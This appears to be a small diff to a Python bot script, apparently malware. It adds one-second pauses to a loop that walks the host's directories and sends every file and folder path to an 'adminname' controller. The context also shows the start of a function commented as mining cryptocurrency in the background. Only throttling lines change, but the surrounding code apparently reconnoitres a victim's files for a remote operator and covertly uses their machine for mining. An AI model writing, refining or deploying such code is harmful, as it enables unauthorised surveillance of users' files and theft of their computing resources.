@@ -321,10 +321,12 @@ def fileList(dir): # List files in current directory
             if debugmode: # If debugmode is True, msgs will print to screen.
                 print(os.path.join(root, name)) # Print the file list to screen if debugmode is enabled.
             sendntc(os.path.join(root, name), adminname)
+            time.sleep(1)
         for name in dirs:
             if debugmode: # If debugmode is True, msgs will print to screen.
                 print(os.path.join(root, name)) # Print the dir list to screen if debugmode is enabled.
             sendntc(os.path.join(root, name), adminname)
+            time.sleep(1)
 
 def bgMining():
     # Mine crypto in the background.
